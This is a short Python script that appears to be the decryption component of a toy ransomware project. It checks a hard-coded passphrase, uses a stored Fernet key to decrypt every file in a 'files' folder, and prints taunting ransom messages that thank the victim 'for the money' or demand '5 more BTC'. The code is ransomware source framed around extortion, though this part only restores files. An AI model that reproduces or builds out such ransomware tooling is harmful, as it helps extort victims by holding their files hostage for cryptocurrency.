import os
from cryptography.fernet import Fernet

DEFAULT_PATH = "files"
REAL_PHRASE = "cameroon"

# * Read the key file
with open("secretkey.key", mode="rb") as key_file:
    secret_key = key_file.read()

secret_phrase = input("Please enter the given secret phrase: ")

if secret_phrase == REAL_PHRASE:

    # * Decryption
    for f in os.listdir(path=DEFAULT_PATH):
        with open(file=f"{DEFAULT_PATH}/{f}", mode="rb") as file:
            contents = file.read()
            # print(contents)
            content_dec = Fernet(secret_key).decrypt(contents)
            # print(contents_dec)
        with open(file=f"{DEFAULT_PATH}/{f}", mode="wb") as file:
            file.write(content_dec)

    print("Congrats, your files have been decrypted. Thanks for the money and enjoy your day :)")

else:

    print("Seems like the lesson is not good enough, send me 5 more BTC and the discussion will continue.")
